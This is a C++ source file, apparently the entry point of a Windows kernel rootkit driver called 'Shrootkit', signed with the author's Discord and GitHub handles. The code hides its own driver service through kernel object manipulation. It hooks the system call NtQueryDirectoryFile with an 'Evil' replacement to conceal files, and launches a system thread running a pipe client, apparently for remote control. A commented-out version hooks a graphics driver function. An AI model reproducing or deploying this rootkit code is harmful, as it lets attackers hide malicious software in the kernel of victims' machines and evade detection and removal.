#include "piping.h"
#include "DKOM.h"
#pragma warning(disable : 4996)


extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING RegistryPath) {
    //UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = ShrootUnload;


    // Hide KmdfDriver driver service:
    if (!NT_SUCCESS(service::HideDriverService(DriverObject, NULL))) {
        return STATUS_UNSUCCESSFUL;
    }


    // Hook all file handling functions initially and save their original data:
    if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", TRUE, 'HkQr'))) {
        return STATUS_UNSUCCESSFUL;
    }
    //if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFileEx, NULL, "NtQueryDirectoryFileEx", TRUE, 'HkQx'))) {
    //    return STATUS_UNSUCCESSFUL;
    //}

    const char* HelloMessage =
        "\n----------\n"
        " _____   _   _  ______ _____  _____ _______   __ ____ _______\n"
        "/ ____\\ | | | || ___  \\  _  |/  _  \\_    _/| / //_  _\\\\_   _/\n"
        "\\ `- -. | |_| || |_/  / | | || | | | | | | |/ /  | |    | |\n"
        " `- -. \\   _  ||     /| | | || | | | | | |    \\  | |    | |\n"
        "/\\__/  /  | | || |\\  \\\\ \\_/ /| \\_/ / | | | |\\  \\_| |_   | |\n"
        "\\____ / \\_| |_|| / \\__|\\___/ \\____/  |_| |_| \\_/\\___/   |_|\n\n"
        "Discord: bldysis#0868  GitHub: shaygitub\n"
        "\n----------\n";

    DbgPrintEx(0, 0, "%s", HelloMessage);


    // Execute pipe client thread:
    HANDLE PipeThread = NULL;
    NTSTATUS status = PsCreateSystemThread(
        &PipeThread,
        GENERIC_ALL,
        NULL,
        NULL,
        NULL,
        (PKSTART_ROUTINE)PipeClient,
        NULL);

    if (!NT_SUCCESS(status))
    {
        DbgPrintEx(0, 0, "KMDFdriver - Failed to create client pipe thread, status code: 0x%x\n", status);
        return STATUS_UNSUCCESSFUL;
    }
    ZwClose(PipeThread);
    return status;
}



/*
extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    //UNREFERENCED_PARAMETER(DriverObject);  // When using manual mapper - cannot use this parameter
    UNREFERENCED_PARAMETER(RegistryPath);  // When using manual mapper - cannot use this parameter
    roothook::KernelFunctionHook(&roothook::HookHandler, "\\SystemRoot\\System32\\drivers\\dxgkrnl.sys", "NtQueryCompositionSurfaceStatistics");  // Call the hook handler to handle a call for specific hooking
    NTSTATUS status = STATUS_SUCCESS;
    DbgPrintEx(0, 0, "KMDFdriver LOADED\n");
    DbgPrintEx(0, 0, "KMDFdriver RegistryPath: %wZ\n", RegistryPath);
    return status;
}
*/